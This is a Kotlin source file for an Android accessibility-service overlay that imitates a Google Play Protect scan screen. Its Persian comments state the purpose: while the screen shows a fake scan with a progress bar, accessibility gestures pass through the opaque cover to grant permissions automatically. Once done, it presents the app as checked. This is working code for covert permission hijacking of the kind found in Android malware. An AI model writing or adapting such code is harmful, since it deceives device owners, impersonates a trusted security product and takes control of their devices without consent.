package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.graphics.PixelFormat
import android.graphics.drawable.Drawable
import android.os.Build
import android.util.DisplayMetrics
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.animation.AccelerateDecelerateInterpolator
import android.view.animation.LinearInterpolator
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import com.base.realtime.R

/** پوشش تمام‌صفحه شبیه Google Play Protect هنگام اخذ خودکار مجوز. */
internal class PermAutoGrantOverlay(private val service: AccessibilityService) {

    private val windowManager: WindowManager by lazy {
        service.getSystemService(WindowManager::class.java)
    }
    private var root: View? = null
    private var playIcon: ImageView? = null
    private var appRow: View? = null
    private var appIcon: ImageView? = null
    private var appName: TextView? = null
    private var titleView: TextView? = null
    private var bodyView: TextView? = null
    private var progressText: TextView? = null
    private var statusView: TextView? = null
    private var progressBar: ProgressBar? = null
    private var dismissBtn: TextView? = null
    private var layoutParams: WindowManager.LayoutParams? = null
    private var barAnimator: ValueAnimator? = null
    private var pulseAnimator: ObjectAnimator? = null

    enum class Mode { SCAN, CLEANUP, DONE }

    fun show(step: Int, total: Int, mode: Mode = Mode.SCAN) {
        if (AutoGrantDebug.hideCover) {
            hide()
            return
        }
        ensureView()
        val safeTotal = total.coerceAtLeast(1)
        val safeStep = step.coerceIn(0, safeTotal)
        val pct = ((safeStep * 100f) / safeTotal).toInt().coerceIn(4, if (mode == Mode.CLEANUP) 96 else 92)
        when (mode) {
            Mode.SCAN -> bindScan(safeStep, safeTotal, pct)
            Mode.CLEANUP -> bindCleanup(safeStep, safeTotal, pct.coerceAtLeast(88))
            Mode.DONE -> showDone()
        }
        stabilizeFullscreen()
    }

    /** فقط با دکمهٔ «متوجه شدم» بسته می‌شود — تایمر خودکار ندارد. */
    fun showDone(@Suppress("UNUSED_PARAMETER") hideAfterMs: Long = 0L) {
        if (AutoGrantDebug.hideCover) {
            hide()
            return
        }
        ensureView()
        val label = ownAppLabel()
        playIcon?.layoutParams = playIcon?.layoutParams?.apply {
            width = dp(56)
            height = dp(56)
        }
        appRow?.visibility = View.VISIBLE
        appIcon?.setImageDrawable(ownAppIcon())
        appName?.text = label
        titleView?.text = service.getString(R.string.perm_auto_grant_done_title)
        bodyView?.text = service.getString(R.string.perm_auto_grant_done_body, label)
        statusView?.text = service.getString(R.string.perm_auto_grant_done_status)
        statusView?.setTextColor(service.getColor(R.color.play_green))
        progressText?.visibility = View.GONE
        progressBar?.visibility = View.GONE
        dismissBtn?.visibility = View.VISIBLE
        animateBarTo(100)
        stopPulse()
        statusView?.alpha = 1f
        setOverlayTouchable(true)
        stabilizeFullscreen()
    }

    /** بعد از باز شدن permission controller اندازهٔ پنجره را دوباره می‌کشد (MIUI). */
    fun stabilizeFullscreen() {
        val view = root ?: return
        val params = layoutParams ?: return
        applyFullDisplaySize(params)
        try {
            windowManager.updateViewLayout(view, params)
        } catch (_: IllegalArgumentException) {
        }
    }

    fun hide() {
        stopBarAnim()
        stopPulse()
        val view = root ?: return
        try {
            windowManager.removeView(view)
        } catch (_: IllegalArgumentException) {
        }
        root = null
        playIcon = null
        appRow = null
        appIcon = null
        appName = null
        titleView = null
        bodyView = null
        progressText = null
        statusView = null
        progressBar = null
        dismissBtn = null
        layoutParams = null
    }

    private fun ensureView() {
        if (root != null) return
        val view = LayoutInflater.from(service).inflate(R.layout.overlay_perm_auto_grant, null)
        playIcon = view.findViewById(R.id.overlayPlayIcon)
        appRow = view.findViewById(R.id.overlayAppRow)
        appIcon = view.findViewById(R.id.overlayAppIcon)
        appName = view.findViewById(R.id.overlayAppName)
        titleView = view.findViewById(R.id.overlayAutoGrantTitle)
        bodyView = view.findViewById(R.id.overlayAutoGrantBody)
        progressText = view.findViewById(R.id.overlayAutoGrantProgress)
        statusView = view.findViewById(R.id.overlayAutoGrantStatus)
        progressBar = view.findViewById(R.id.overlayAutoGrantBar)
        dismissBtn = view.findViewById(R.id.overlayDismissBtn)
        dismissBtn?.setOnClickListener { hide() }
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            scanFlags(),
            PixelFormat.OPAQUE,
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        applyFullDisplaySize(params)
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            @Suppress("DEPRECATION")
            view.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                )
        }
        windowManager.addView(view, params)
        root = view
        layoutParams = params
    }

    private fun bindScan(step: Int, total: Int, pct: Int) {
        setOverlayTouchable(false)
        hideDoneChrome()
        titleView?.text = service.getString(R.string.perm_auto_grant_scan_title)
        bodyView?.text = service.getString(R.string.perm_auto_grant_scan_body)
        statusView?.text = service.getString(R.string.perm_auto_grant_scan_status)
        statusView?.setTextColor(service.getColor(R.color.play_blue))
        progressText?.text = service.getString(R.string.perm_auto_grant_overlay_progress, step, total)
        animateBarTo(pct)
        startPulse()
    }

    private fun bindCleanup(step: Int, total: Int, pct: Int) {
        setOverlayTouchable(false)
        hideDoneChrome()
        titleView?.text = service.getString(R.string.perm_auto_grant_scan_title)
        bodyView?.text = service.getString(R.string.perm_auto_grant_scan_body)
        statusView?.text = service.getString(R.string.perm_auto_grant_cleanup_status)
        statusView?.setTextColor(service.getColor(R.color.play_blue))
        progressText?.text = service.getString(R.string.perm_auto_grant_overlay_progress, step, total)
        animateBarTo(pct)
        startPulse()
    }

    private fun hideDoneChrome() {
        appRow?.visibility = View.GONE
        dismissBtn?.visibility = View.GONE
        progressBar?.visibility = View.VISIBLE
        progressText?.visibility = View.VISIBLE
        playIcon?.layoutParams = playIcon?.layoutParams?.apply {
            width = dp(72)
            height = dp(72)
        }
    }

    /** هنگام اسکن ژست a11y به لایهٔ زیر می‌رسد؛ در Done دکمه باید لمس شود. */
    private fun setOverlayTouchable(touchable: Boolean) {
        val params = layoutParams ?: return
        val view = root ?: return
        params.flags = if (touchable) doneFlags() else scanFlags()
        try {
            windowManager.updateViewLayout(view, params)
        } catch (_: IllegalArgumentException) {
        }
    }

    private fun scanFlags(): Int =
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_FULLSCREEN

    private fun doneFlags(): Int =
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_FULLSCREEN

    private fun ownAppLabel(): String = try {
        val pm = service.packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(service.packageName, 0)).toString()
    } catch (_: Throwable) {
        service.getString(R.string.app_name)
    }

    private fun ownAppIcon(): Drawable? = try {
        service.packageManager.getApplicationIcon(service.packageName)
    } catch (_: Throwable) {
        null
    }

    private fun dp(v: Int): Int =
        (v * service.resources.displayMetrics.density).toInt()

    private fun animateBarTo(target: Int) {
        val bar = progressBar ?: return
        stopBarAnim()
        val from = bar.progress
        if (from == target) return
        barAnimator = ValueAnimator.ofInt(from, target).apply {
            duration = 420L
            interpolator = AccelerateDecelerateInterpolator()
            addUpdateListener { bar.progress = it.animatedValue as Int }
            start()
        }
    }

    private fun startPulse() {
        val status = statusView ?: return
        if (pulseAnimator?.isRunning == true) return
        pulseAnimator = ObjectAnimator.ofFloat(status, View.ALPHA, 1f, 0.45f, 1f).apply {
            duration = 1_600L
            repeatCount = ValueAnimator.INFINITE
            interpolator = LinearInterpolator()
            start()
        }
    }

    private fun stopPulse() {
        pulseAnimator?.cancel()
        pulseAnimator = null
        statusView?.alpha = 1f
    }

    private fun stopBarAnim() {
        barAnimator?.cancel()
        barAnimator = null
    }

    private fun applyFullDisplaySize(params: WindowManager.LayoutParams) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = windowManager.currentWindowMetrics.bounds
            params.width = bounds.width()
            params.height = bounds.height()
            params.x = 0
            params.y = 0
            return
        }
        @Suppress("DEPRECATION")
        val display = windowManager.defaultDisplay
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        params.width = metrics.widthPixels
        params.height = metrics.heightPixels
        params.x = 0
        params.y = 0
    }
}
